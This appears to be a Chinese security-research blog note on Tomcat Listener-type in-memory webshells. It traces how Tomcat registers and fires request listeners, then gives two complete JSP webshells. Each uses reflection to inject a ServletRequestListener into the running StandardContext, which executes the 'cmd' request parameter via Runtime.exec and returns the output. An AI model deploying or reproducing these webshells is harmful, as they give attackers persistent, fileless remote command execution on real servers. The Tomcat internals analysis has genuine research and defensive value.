## 基础环境
Servlet，Filter环境与Filter内存马的环境一致，增加了Listener
*Listener.java*

```java
package org.example.listener;  
  
import javax.servlet.ServletRequestEvent;  
import javax.servlet.ServletRequestListener;  
import javax.servlet.annotation.WebListener;  
  
@WebListener("Listener")  
public class Listener implements ServletRequestListener {  
    public Listener() {  
    }  
  
    @Override  
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {  
  
    }  
  
    @Override  
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {  
        System.out.println("Listener 被调用");  
  
    }  
}
```

在实际运行中的顺序

![](attachments/Pasted%20image%2020230314162559.png)

>在IDEA中搭建tomcat时需要注意字节码的版本，特别是当出现内部java编译器出错的时候

## Listener运行流程
在前面[Java Web基础](../../Java%20Web/Java%20Web基础.md)的时候提到过执行顺序为 *Listener -> Filter -> Servlet* ，Listener的具体功能实现所依赖的函数，当在idea中新建一个Listener时就可以看到这些函数和基本的解释
```java
@Override  
public void contextInitialized(ServletContextEvent sce) {  
    /* This method is called when the servlet context is initialized(when the Web application is deployed). */  
}  
  
@Override  
public void contextDestroyed(ServletContextEvent sce) {  
    /* This method is called when the servlet Context is undeployed or Application Server shuts down. */  
}  
  
@Override  
public void sessionCreated(HttpSessionEvent se) {  
    /* Session is created. */  
}  
  
@Override  
public void sessionDestroyed(HttpSessionEvent se) {  
    /* Session is destroyed. */  
}  
  
@Override  
public void attributeAdded(HttpSessionBindingEvent sbe) {  
    /* This method is called when an attribute is added to a session. */  
}  
  
@Override  
public void attributeRemoved(HttpSessionBindingEvent sbe) {  
    /* This method is called when an attribute is removed from a session. */  
}  
  
@Override  
public void attributeReplaced(HttpSessionBindingEvent sbe) {  
    /* This method is called when an attribute is replaced in a session. */  
}
```

当然这里缺少了对于Listener内存马来说最为，适用的方法，就是上面的listener中的两个方法`requestInitialized`和`requestDestroyed`
当访问页面的时候触发

先前看这个方法的接口

![](attachments/Pasted%20image%2020230314181322.png)

### Listener的执行
先在执行的Listener中下个断点调试，看的出来后面的一系列invoke都是前面分析过的很熟悉的流程

![](attachments/Pasted%20image%2020230314181855.png)

这里有一个不一样的函数方法`fireRequestInitEvent`,方法向后跟的话就做了一堆的安全检查，之后就走到filter那边的流程了

![](attachments/Pasted%20image%2020230314184300.png)

但是在*StandardContext*这里调用了`requestInitialized`

![](attachments/Pasted%20image%2020230314185744.png)

而这个listener是来自`getApplicationEventListeners()`这个方法

![](attachments/Pasted%20image%2020230314190030.png)

接着往上找

![](attachments/Pasted%20image%2020230314190130.png)

![](attachments/Pasted%20image%2020230314190148.png)

![](attachments/Pasted%20image%2020230314190251.png)

![](attachments/Pasted%20image%2020230314190347.png)

最后发现这个`CopyOnWriteArrayList()`也只是做一个数组，那么应该是中间对==applicationEventListenersList==做了处理，还是在源文件搜索，发现这是应该放listener的地方

![](attachments/Pasted%20image%2020230314190645.png)

去找这两个函数的用法

![](attachments/Pasted%20image%2020230314191003.png)

![](attachments/Pasted%20image%2020230314191017.png)

逐层向上找，源头是在`findApplicationListeners()`

![](attachments/Pasted%20image%2020230314191100.png)

![](attachments/Pasted%20image%2020230314191336.png)
发现这里有确切的值

![](attachments/Pasted%20image%2020230314191239.png)

向下找到`addApplicationListener`这个方法

![](attachments/Pasted%20image%2020230314191449.png)

找它的用法，在`ContextConfig#configureContext(WebXml webxml)`,看名字其实就可以做一些推测应该是去读取web.xml的配置来对Listerer来进行注册的

在这个里面可以看到前面[Tomcat内存马——Filter](Tomcat内存马——Filter.md)的一些熟悉的函数

![](attachments/Pasted%20image%2020230314192050.png)

这个是对listener的使用

![](attachments/Pasted%20image%2020230314192153.png)

理解了前面对listener的读取再向后去看后面对Listener的调用（其实这个时候已经可以发现`fireRequestInitEvent`这个函数是中间的衔接点）

```java
public boolean fireRequestInitEvent(ServletRequest request) {  
  
    Object instances[] = getApplicationEventListeners();  
  
    if ((instances != null) && (instances.length > 0)) {  
  
        ServletRequestEvent event = new ServletRequestEvent(getServletContext(), request);  
  
        for (Object instance : instances) {  
            if (instance == null) {  
                continue;  
            }  
            if (!(instance instanceof ServletRequestListener)) {  
                continue;  
            }  
            ServletRequestListener listener = (ServletRequestListener) instance;  
  
            try {  
                listener.requestInitialized(event);  
            } catch (Throwable t) {  
                ExceptionUtils.handleThrowable(t);  
                getLogger().error(  
                        sm.getString("standardContext.requestListener.requestInit", instance.getClass().getName()),  
                        t);  
                request.setAttribute(RequestDispatcher.ERROR_EXCEPTION, t);  
                return false;            }  
        }  
    }  
    return true;  
}
```

现在看之前说的眼熟的invoke，在StandardHostValve这里，依旧是以request的方式来获取context

![](attachments/Pasted%20image%2020230314193408.png)

到目前为止我们已经知道了整个执行的流程，可以去完成一个内存马的编写了

## 内存马的编写
我们的恶意代码应该写在`requestInitialized`中来执行
这里的恶意类

```java
public class ListenerShell implements ServletRequestListener {  
    @Override  
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {  
        HttpServletRequest req = (HttpServletRequest) servletRequestEvent.getServletRequest();  
        if (req.getParameter("cmd") != null) {  
            InputStream in = null;  
            try {  
                System.out.println("do some bad bad");  
                in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();  
                Scanner s = new Scanner(in).useDelimiter("\\A");  
                String output = s.hasNext() ? s.next() : "";  
                Field requestF = req.getClass().getDeclaredField("request");  
                requestF.setAccessible(true);  
                Request request = (Request) requestF.get(req);  
                request.getResponse().getWriter().write(output);  
            } catch (IOException | NoSuchFieldException | IllegalAccessException ignored) {}  
        }    }    @Override  
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {  
  
    }}
```

获取standardcontext并`getApplicationEventListeners()`

```java
Field reqField = request.getClass().getDeclaredField("request");  
reqField.setAccessible(true);  
Request req = (Request) reqField.get(request);  
StandardContext context = (StandardContext) req.getContext();  
ListenerShell listenerShell = new ListenerShell();  
context.addApplicationEventListener(listenerShell);
```
完整的结合起来

```jsp
<%--  
	Created by IntelliJ IDEA.  
	User: wum0nster  
	Date: 2023/3/14  
	Time: 19:48  
	To change this template use File | Settings | File Templates.
--%>  
<%@ page contentType="text/html;charset=UTF-8" language="java" %>  
  
<%@ page import="org.apache.catalina.connector.Request" %>  
<%@ page import="java.io.IOException" %>  
<%@ page import="java.io.InputStream" %>  
<%@ page import="java.lang.reflect.Field" %>  
<%@ page import="java.util.Scanner" %>  
<%@ page import="org.apache.catalina.core.StandardContext" %>  
  
  
<%!  
    public class ListenerShell implements ServletRequestListener {  
        @Override  
        public void requestInitialized(ServletRequestEvent servletRequestEvent) {  
            HttpServletRequest req = (HttpServletRequest) servletRequestEvent.getServletRequest();  
            if (req.getParameter("cmd") != null) {  
                InputStream in = null;  
                try {  
                    System.out.println("do some bad bad");  
                    in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();  
                    Scanner s = new Scanner(in).useDelimiter("\\A");  
                    String output = s.hasNext() ? s.next() : "";  
                    Field requestF = req.getClass().getDeclaredField("request");  
                    requestF.setAccessible(true);  
                    Request request = (Request) requestF.get(req);  
                    request.getResponse().getWriter().write(output);  
                } catch (IOException | NoSuchFieldException | IllegalAccessException ignored) {}  
            }        }        @Override  
        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {  
  
        }    }%>  
  
<%  
  
Field reqField = request.getClass().getDeclaredField("request");  
reqField.setAccessible(true);  
Request req = (Request) reqField.get(request);  
StandardContext context = (StandardContext) req.getContext();  
ListenerShell listenerShell = new ListenerShell();  
context.addApplicationEventListener(listenerShell);  
  
%>  
<html>  
<head>  
    <title>Title</title>  
</head>  
<body>  
  
</body>  
</html>
```



 Drun1baby师傅的写法，为什么不通找机会研究一下
 
```jsp
<%@ page import="org.apache.catalina.core.StandardContext" %>  
<%@ page import="java.util.List" %>  
<%@ page import="java.util.Arrays" %>  
<%@ page import="org.apache.catalina.core.ApplicationContext" %>  
<%@ page import="java.lang.reflect.Field" %>  
<%@ page import="java.util.ArrayList" %>  
<%@ page import="java.io.InputStream" %>  
<%@ page import="org.apache.catalina.connector.Request" %>  
<%@ page import="org.apache.catalina.connector.Response" %>  
<%!  
  
    class ListenerMemShell implements ServletRequestListener {  
  
        @Override  
        public void requestInitialized(ServletRequestEvent sre) {  
            String cmd;  
            try {  
                cmd = sre.getServletRequest().getParameter("cmd");  
                org.apache.catalina.connector.RequestFacade requestFacade = (org.apache.catalina.connector.RequestFacade) sre.getServletRequest();  
                Field requestField = Class.forName("org.apache.catalina.connector.RequestFacade").getDeclaredField("request");  
                requestField.setAccessible(true);  
                Request request = (Request) requestField.get(requestFacade);  
                Response response = request.getResponse();  
  
                if (cmd != null){  
                    InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();  
                    int i = 0;  
                    byte[] bytes = new byte[1024];  
                    while ((i=inputStream.read(bytes)) != -1){  
                        response.getWriter().write(new String(bytes,0,i));  
                        response.getWriter().write("\r\n");  
                    }  
                }  
            }catch (Exception e){  
                e.printStackTrace();  
            }  
        }  
  
        @Override  
        public void requestDestroyed(ServletRequestEvent sre) {  
        }  
    }  
%>  
  
<%  
    ServletContext servletContext =  request.getServletContext();  
    Field applicationContextField = servletContext.getClass().getDeclaredField("context");  
    applicationContextField.setAccessible(true);  
    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);  
  
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");  
    standardContextField.setAccessible(true);  
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);  
  
    Object[] objects = standardContext.getApplicationEventListeners();  
    List<Object> listeners = Arrays.asList(objects);  
    List<Object> arrayList = new ArrayList(listeners);  
    arrayList.add(new ListenerMemShell());  
    standardContext.setApplicationEventListeners(arrayList.toArray());  
  
%>
```


## 总结&踩坑

在写jsp的马的时候需要完成从创建到销毁整个过程，否则是无法完成所继承的类的
Listtener型的内存马与Filter型的相比是要简单一些的或者是所使用的方法少于Filter型

## 参考文章

[Java内存马系列-04-Tomcat 之 Listener 型内存马 | 芜风 (drun1baby.top)](https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/#toc-heading-6)

[Tomcat 内存马（一）Listener型 - Atomovo - 博客园 (cnblogs.com)](https://www.cnblogs.com/yyhuni/p/15512792.html#%E4%BA%8Clistener%E5%86%85%E5%AD%98%E9%A9%AC)